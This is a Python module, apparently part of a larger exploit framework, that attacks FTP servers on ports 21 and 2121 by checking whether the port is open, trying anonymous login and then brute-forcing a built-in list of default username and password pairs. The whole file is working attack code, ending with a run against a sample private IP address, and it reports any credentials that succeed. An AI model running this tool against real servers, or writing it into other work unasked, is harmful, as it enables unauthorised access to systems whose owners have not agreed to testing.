"""
FTP Exploit Module
Exploits File Transfer Protocol vulnerabilities
"""

import socket
import ftplib
from typing import Dict, Tuple

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class FTP_Exploit(BaseExploit):
    """
    FTP Brute Force and Anonymous Login Exploit
    Targets: FTP servers (port 21)
    """
    
    def __init__(self):
        super().__init__(
            name="FTP_Exploit",
            target_ports=[21, 2121],
            target_os=["Windows", "Linux", "Unix"]
        )
        
        # Common FTP credentials
        self.ftp_credentials = [
            ("anonymous", "anonymous"),
            ("anonymous", ""),
            ("ftp", "ftp"),
            ("admin", "admin"),
            ("root", "root"),
            ("user", "user"),
            ("test", "test"),
            ("guest", "guest"),
        ]
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if FTP is accessible"""
        ip = target['ip']
        
        # Check if FTP port is open
        if 21 not in target.get('open_ports', []) and 2121 not in target.get('open_ports', []):
            return False
        
        port = 21 if 21 in target.get('open_ports', []) else 2121
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                logger.debug(f"FTP port {port} accessible on {ip}")
                return True
        except Exception as e:
            logger.debug(f"FTP check failed on {ip}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt FTP exploitation"""
        ip = target['ip']
        port = 21 if 21 in target.get('open_ports', []) else 2121
        
        logger.info(f"Attempting FTP exploit on {ip}:{port}")
        
        try:
            # Try anonymous login first
            if self._try_anonymous_login(ip, port):
                self.stats['success'] += 1
                logger.success(f"FTP anonymous access on {ip}")
                
                return True, {
                    'method': 'FTP_Anonymous',
                    'credentials': 'anonymous:anonymous',
                    'port': port,
                    'service': 'FTP'
                }
            
            # Try brute force
            for username, password in self.ftp_credentials:
                logger.debug(f"Trying FTP: {username}:{password}")
                
                if self._try_ftp_login(ip, port, username, password):
                    self.stats['success'] += 1
                    logger.success(f"FTP access gained on {ip} with {username}:{password}")
                    
                    return True, {
                        'method': 'FTP_BruteForce',
                        'credentials': f"{username}:{password}",
                        'port': port,
                        'service': 'FTP'
                    }
            
            # All attempts failed
            self.stats['failure'] += 1
            logger.warning(f"FTP exploit failed on {ip}")
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"FTP exploit error on {ip}: {e}")
            return False, {}
    
    def _try_anonymous_login(self, ip: str, port: int) -> bool:
        """Try anonymous FTP login"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=5)
            ftp.login('anonymous', 'anonymous')
            ftp.quit()
            return True
        except:
            return False
    
    def _try_ftp_login(self, ip: str, port: int, username: str, password: str) -> bool:
        """Try FTP login with credentials"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=5)
            ftp.login(username, password)
            ftp.quit()
            return True
        except:
            return False


if __name__ == "__main__":
    exploit = FTP_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [21],
        'os_guess': 'Linux'
    }
    
    if exploit.check_vulnerable(test_target):
        print("Target is vulnerable to FTP exploit")
        success, result = exploit.exploit(test_target)
        if success:
            print(f"Exploit successful: {result}")
